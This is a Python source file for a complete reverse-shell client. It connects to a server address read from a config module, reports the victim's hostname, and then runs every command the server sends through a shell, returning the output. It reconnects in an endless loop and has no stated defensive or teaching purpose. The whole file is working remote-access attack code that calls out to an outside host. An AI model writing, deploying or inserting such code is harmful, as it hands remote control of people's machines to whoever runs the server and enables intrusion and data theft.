import os
import sys
import time
import socket
import signal
import struct
import subprocess
from config import Config


class Client(object):
    def __init__(self):
        self.serverHost = Config.IP_ADDRESS
        self.serverPort = Config.PORT
        self.socket = None

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_conn)
        signal.signal(signal.SIGTERM, self.quit_conn)
        return

    def quit_conn(self, signal=None, frame=None):
        print("\n....Quitting Connection.....")
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print("Could not close connection %s" % str(e))

        sys.exit(0)
        return

    def create_socket(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("Socket creation error" + str(e))
            return
        return

    def connect_socket(self):
        """ Connect to a remote socket """
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print("Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            print("Cannot send hostname to server: " + str(e))
            raise
        return

    def command_shell(self, output_str):
        """ Prints command output """
        sent_message = str.encode(output_str + str(os.getcwd()) + "$ ")
        self.socket.send(struct.pack(">I", len(sent_message)) + sent_message)
        print(output_str)
        return

    def receive_commands(self):
        """ Receive commands from remote server and run on local machine """
        try:
            self.socket.recv(10)
        except Exception as e:
            print("Could not start communication with server: %s\n" % str(e))
            return
        cwd = str.encode(str(os.getcwd()) + "$ ")
        self.socket.send(struct.pack(">I", len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b"":
                break
            elif data[:2].decode("utf-8") == "cd":
                directory = data[3:].decode("utf-8")
                try:
                    os.chdir(directory.strip())
                except Exception as e:
                    output_str = "Could not change directory: %s\n" % str(e)
                else:
                    output_str = ""
            elif data[:].decode("utf-8") == "quit":
                self.socket.close()
                break
            elif len(data) > 0:
                try:
                    cmd = subprocess.Popen(
                        data[:].decode("utf-8"),
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                    )
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors="replace")
                except Exception as e:
                    output_str = "Command execution unsuccessful: %s\n" % str(e)
            if output_str is not None:
                try:
                    self.command_shell(output_str)
                except Exception as e:
                    print("Cannot send command output: %s" % str(e))
        self.socket.close()
        return


def main():
    client = Client()
    client.register_signal_handler()
    client.create_socket()
    while True:
        try:
            client.connect_socket()
        except Exception as e:
            print("Error on socket connections: %s" % str(e))
            time.sleep(5)
        else:
            break
    try:
        client.receive_commands()
    except Exception as e:
        print("Error in main: " + str(e))
    client.socket.close()
    return


if __name__ == "__main__":
    while True:
        main()